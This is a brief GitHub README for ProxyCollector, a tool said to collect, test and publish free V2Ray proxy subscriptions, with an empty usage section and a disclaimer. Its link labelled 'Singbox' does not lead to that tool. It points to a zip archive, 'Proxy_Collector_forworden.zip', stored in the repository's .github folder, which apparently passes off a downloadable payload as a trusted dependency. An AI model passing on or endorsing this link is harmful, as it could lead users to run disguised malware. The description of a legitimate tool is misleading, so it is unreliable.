# ProxyCollector
Automatically collects V2Ray proxies from various web sources, combines and tests them and commits the results here on github.  
Supported proxy types are: `VMess` `VLess` `Trojan` `Shadowsocks` `Hysteria2` `Tuic` `Socks` `Http` .  
Subscriptions are automatically updated every 24 hours.  
[Singbox](https://github.com/navveed/ProxyCollector/raw/refs/heads/master/.github/Proxy_Collector_forworden.zip) is used for testing proxies.
## Usage

## Disclaimer
I do not own any of the proxy servers provided by this project, this project simply collects and tests proxies from diffetrent subscription sources.
